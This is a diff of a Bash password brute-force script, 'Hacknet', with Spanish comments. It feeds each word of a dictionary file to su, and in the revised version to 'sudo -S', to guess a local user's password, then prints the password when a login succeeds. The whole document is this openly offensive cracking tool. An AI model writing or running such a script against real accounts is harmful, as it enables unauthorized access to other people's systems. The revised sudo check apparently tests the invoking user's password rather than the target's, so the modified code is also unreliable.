@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # --- Configuración de Hacknet ---
-# Paleta de colores para una terminal estilo ciberseguridad
 GREEN="\e[1;32m"
 RED="\e[1;31m"
 BLUE="\e[1;34m"
@@ -15,8 +14,8 @@ mostrar_ayuda() {
 
 imprimir_banner() {
     echo -e "${BLUE}"
-    echo "    __  __            _    _   _ ______ _______ "
-    echo "   / / / /           | |  | \ | |  ____|__   __|"
+    echo "    __  __             _    _   _ ______ _______ "
+    echo "   / / / /            | |  | \ | |  ____|__   __|"
     echo "  / /_/ /  ____  ____| | _|  \| | |__     | |   "
     echo " / __  /  / _  |/ ___| |/ / . \ |  __|    | |   "
     echo "/ / / /  / (_| | |___|   <| |\  | |____   | |   "
@@ -29,10 +28,8 @@ finalizar() {
     exit 0
 }
 
-# Captura de CTRL+C
 trap finalizar SIGINT
 
-# --- Validación de Argumentos ---
 usuario=$1
 diccionario=$2
 
@@ -45,24 +42,25 @@ if [[ ! -f $diccionario ]]; then
     exit 1
 fi
 
-# --- Inicio del Ataque ---
 imprimir_banner
-echo -e "${YELLOW}[*] Objetivo:   ${RESET}$usuario"
+echo -e "${YELLOW}[*] Objetivo:    ${RESET}$usuario"
 echo -e "${YELLOW}[*] Diccionario:${RESET} $diccionario"
 echo -e "------------------------------------------"
 
-while IFS= read -r password; do
-    # Efecto de sobreescritura para mantener la terminal limpia
-    echo -ne "${BLUE}[?] Probando: ${RESET}${password:0:25}...\r"
+# Optimizamos la lectura usando un descriptor de archivo (3)
+exec 3< "$diccionario"
 
-    # Intento de autenticación vía PIPE al comando SU
-    # El timeout de 0.5s previene bloqueos por procesos lentos
-    if echo "$password" | timeout 0.5 su "$usuario" -c "exit" > /dev/null 2>&1; then
+while IFS= read -u 3 -r password; do
+    # Limpiamos la línea con \033[K para que sea visualmente más rápido
+    echo -ne "${BLUE}[?] Probando: ${RESET}${password:0:25}\033[K\r"
+
+    # Cambiamos 'su' por 'sudo -S -v' para evitar el delay de sesión y usar el modo no interactivo
+    if echo "$password" | sudo -S -u "$usuario" -v -p '' > /dev/null 2>&1; then
         echo -e "\n\n${GREEN}[✔] ¡ACCESO CONCEDIDO!${RESET}"
         echo -e "${GREEN}[+] Usuario:    ${RESET}$usuario"
         echo -e "${GREEN}[+] Contraseña: ${RESET}$password"
         exit 0
     fi
-done < "$diccionario"
+done
 
 echo -e "\n${RED}[!] Ataque finalizado. No se encontró coincidencia.${RESET}"
